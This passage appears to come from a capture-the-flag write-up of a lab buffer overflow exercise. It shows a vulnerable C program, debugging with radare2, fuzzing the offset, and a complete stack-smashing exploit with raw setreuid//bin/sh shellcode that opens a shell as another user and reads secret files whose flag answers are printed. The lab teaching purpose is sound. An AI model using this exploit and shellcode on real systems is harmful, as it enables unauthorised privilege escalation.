\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd1\ufffdf\ufffd\ufffdjqXH\ufffd\ufffdj;XH1\ufffdI\ufffd//bin/shI\ufffdAPH\ufffd\ufffdRWH\ufffd\ufffdj<XH1\ufffdAAAAAAAAAAAAAA\ufffd\ufffd\ufffd\ufffd\ufffd
sh-4.2$ 
sh-4.2$ id 
uid=1002(user2) gid=1001(user1) groups=1001(user1)
sh-4.2$ whoami
user2
sh-4.2$ cat secret.txt
omgyoudidthissocool!!
sh-4.2$ 
```
### Q1 Flag from secret? 
Answer: omgyoudidthissocool!!

# Buffer Overflow 2

Files present show a similar situation the file is accessible with by the owner to read  but has the suid bit set. Similar to Task 8.
```
overflow-4]$ ls -la
...
-rwsr-xr-x 1 user3 user3 8272 Sep  3  2019 buffer-overflow-2
-rw-rw-r-- 1 user1 user1  250 Sep  3  2019 buffer-overflow-2.c
-rw------- 1 user3 user3   17 Sep  2  2019 secret.txt
```

The script we are looking at also used buffer variable, this time 154 bytes.

```
overflow-4]$ cat buffer-overflow-2.c
#include <stdio.h>
#include <stdlib.h>

void concat_arg(char *string)
{
    char buffer[154] = "doggo";
    strcat(buffer, string);
    printf("new word is %s\n", buffer);
    return 0;
}

int main(int argc, char **argv)
{
    concat_arg(argv[1]);
}
[user1@ip-10-49-156-240 overflow-4]$ 
```
Using similar approach to Task 8 with radare2:
```
overflow-4]$ radare2 -d  buffer-overflow-2
Process with PID 12958 started...
= attach 12958 12958
bin.baddr 0x00400000
Using 0x400000
asm.bits 64
 -- Don\u2019t feed the bugs! (except delicious stacktraces)!
```
Analyse 
```
[0x7ffff7dd9ef0]> aaa
[Cannot analyze at 0x00600ff0g with sym. and entry0 (aa)
Invalid address from 0x00400629
[x] Analyze all flags starting with sym. and entry0 (aa)
[Warning: Invalid range. Use different search.in=? or anal.in=dbg.maps.x
Warning: Invalid range. Use different search.in=? or anal.in=dbg.maps.x
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[TOFIX: aaft can't run in debugger mode.ions (aaft)
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
```
Set brake point at concat_arg method:
```
[0x7ffff7dd9ef0]> db sym.concat_arg
```
Run the program with any argument similarly:
```
[0x7ffff7dd9ef0]> ood AAAA
Wait event received by different pid 12958
Process with PID 12965 started...
= attach 12965 12965
File dbg:///home/user1/overflow-4/buffer-overflow-2  AAAA reopened in read-write mode
12965
```
Next dc tells radare2 to continue running the target process until it hits break point
Now radare2 will stop inside concat_arg:
```
[0x7ffff7dd9ef0]> dc
hit breakpoint at: 400527
```
Get the actual stack addresses of locals:
```
[0x00400527]> afvd
arg arg1 =   : rdi : 0x7fffffffe5f5
var var_a8h = 0x7fffffffe218 = (qword)0x0000000000000000
var var_a0h = 0x7fffffffe220 = (qword)0x0000000000000000
var var_98h = 0x7fffffffe228 = (qword)0x0000000000000000
var var_90h = 0x7fffffffe230 = (qword)0x0000000000000000


```
Not real clear which is which so a closer look is required.

So in the assembly, the buffer must be whichever stack variable is:
- the largest
- used with lea before strcat
- zero‑initialized
- filled with “doggo”

These are four 8‑byte slots (qwords).
- But the buffer is 154 bytes, so it will span multiple of these slots.
- The compiler does NOT show “buffer” as one variable — it shows the start of the region.
- The 154‑byte buffer starts at the lowest address, which is:
  var_90h = rbp - 0x90
- The entire stack is 0xb0 = 176 bytes

Confirmed Var_90h at 0x00400556 
```
lea rdx, [var_90h]   ← load address of buffer
mov rdi, rdx         ← rdi = buffer
call strcat
```
RIP address from Var_90h in python can be determined with:
```
buffer_addr = 0x00007fffffffe300 → 
rip = buffer_addr.to_bytes(8, 'little')
rip = b"\x68\xe2\xff\xff\xff\x7f"
```
Shell will be similar previous situation so skip and use same one as before with setreuid with a slight change for 1003 instead comppnent included.
```
'\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05' + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'
```

Still need to fuzz the offset for payload 
```
overflow-4]$ ./buffer-overflow-2 $(python -c "print 'A'*154")
new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
Works until 155 entered so is saved RBP
```
overflow-4]$ ./buffer-overflow-2 $(python -c "print 'A'*155")
new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
```
A closer to look at RIP, after trial and error

Start after several tries 166, showed A in the address but not completely filled.

```
overflow-4]$ radare2 -d ./buffer-overflow-2 "$(python -c 'print("A"*166)')"
...
[0x7ffff7dd9ef0]> dc
new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x00414141 code=1 ret=0
[0x00414141]> exit

```
Try 167
```
overflow-4]$ radare2 -d ./buffer-overflow-2 "$(python -c 'print("A"*167)')"
...
[0x7ffff7dd9ef0]> dc
new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x41414141 code=1 ret=0
[0x41414141]> dr rip
0x41414141
[0x41414141]>
```
while here get the stackpointer address: dr rsp
```
[0x41414141]> dr
rax = 0x000000b9
rbx = 0x00000000
rcx = 0x00000000
rdx = 0x00000000
r8 = 0x000000ac
r9 = 0x7ffff7b594b0
r10 = 0x4141414141414141
r11 = 0x00000246
r12 = 0x00400450
r13 = 0x7fffffffe3c0
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x00602260
rdi = 0x00000000
rsp = 0x7fffffffe2d0
rbp = 0x4141414141414141
rip = 0x41414141
rflags = 0x00010202
orax = 0xffffffffffffffff
[0x41414141]> dr rsp
0x7fffffffe2d0
[0x41414141]> 
```
```
Now in summary what we have:
offset = 167
buf_addr = 0x7fffffffe2c0          # var_90h from radare2
rip = buf_addr.to_bytes(8, 'little')

payload  = b"\x90" * 40            # NOP sled (tune as you like)
payload += shellcode               # your setreuid + /bin/sh
payload += b"A" * (offset - len(payload))
payload += rip
```
[0x00400527]> pdf @ sym.concat_arg
            ;-- rip:
\u250c 133: sym.concat_arg (int64_t arg1);
\u2502           ; var int64_t var_a8h @ rbp-0xa8
\u2502           ; var int64_t var_a0h @ rbp-0xa0
\u2502           ; var int64_t var_98h @ rbp-0x98
\u2502           ; var int64_t var_90h @ rbp-0x90
\u2502           ; arg int64_t arg1 @ rdi
\u2502           ; CALL XREF from main @ 0x4005c9
\u2502           0x00400527 b    55             push rbp
\u2502           0x00400528      4889e5         mov rbp, rsp
\u2502           0x0040052b      4881ecb00000.  sub rsp, 0xb0
\u2502           0x00400532      4889bd58ffff.  mov qword [var_a8h], rdi    ; arg1
\u2502           0x00400539      48b8646f6767.  movabs rax, 0x6f67676f64    ; 'doggo'
\u2502           0x00400543      ba00000000     mov edx, 0
\u2502           0x00400548      48898560ffff.  mov qword [var_a0h], rax
\u2502           0x0040054f      48899568ffff.  mov qword [var_98h], rdx
\u2502           0x00400556      488d9570ffff.  lea rdx, [var_90h]
\u2502           0x0040055d      b800000000     mov eax, 0
\u2502           0x00400562      b911000000     mov ecx, 0x11               ; 17
\u2502           0x00400567      4889d7         mov rdi, rdx
\u2502           0x0040056a      f348ab         rep stosq qword [rdi], rax
\u2502           0x0040056d      4889fa         mov rdx, rdi
\u2502           0x00400570      668902         mov word [rdx], ax
\u2502           0x00400573      4883c202       add rdx, 2
\u2502           0x00400577      488b9558ffff.  mov rdx, qword [var_a8h]
\u2502           0x0040057e      488d8560ffff.  lea rax, [var_a0h]
\u2502           0x00400585      4889d6         mov rsi, rdx
\u2502           0x00400588      4889c7         mov rdi, rax
\u2502           0x0040058b      e8b0feffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
\u2502           0x00400590      488d8560ffff.  lea rax, [var_a0h]
\u2502           0x00400597      4889c6         mov rsi, rax
\u2502           0x0040059a      bf70064000     mov edi, str.new_word_is__s ; 0x400670 ; "new word is %s\n"
\u2502           0x0040059f      b800000000     mov eax, 0
\u2502           0x004005a4      e887feffff     call sym.imp.printf         ; int printf(const char *format)
\u2502           0x004005a9      90             nop
\u2502           0x004005aa      c9             leave
\u2514           0x004005ab      c3             ret
[0x00400527]> 

```
Final run:
```
overflow-4]$ ./buffer-overflow-2 $(python -c "print(
> '\x90'*90 +
> '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05' +
> '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' +
> '\x90'*19 +
>'\x68\xe2\xff\xff\xff\x7f'
> )")
new word is doggo\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd1\ufffdf\ufffd\ufffdjqXH\ufffd\ufffdj;XH1\ufffdI\ufffd//bin/shI\ufffdAPH\ufffd\ufffdRWH\ufffd\ufffdj<XH1\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdh\ufffd\ufffd\ufffd\ufffd
sh-4.2$ id 
uid=1003(user3) gid=1001(user1) groups=1001(user1)
sh-4.2$ whoami
user3
sh-4.2$ cat secret.txt
wowanothertime!!
sh-4.2$ 
```


### Question 1: Use the same method to read the contents of the secret file! Answer: wowanothertime!!
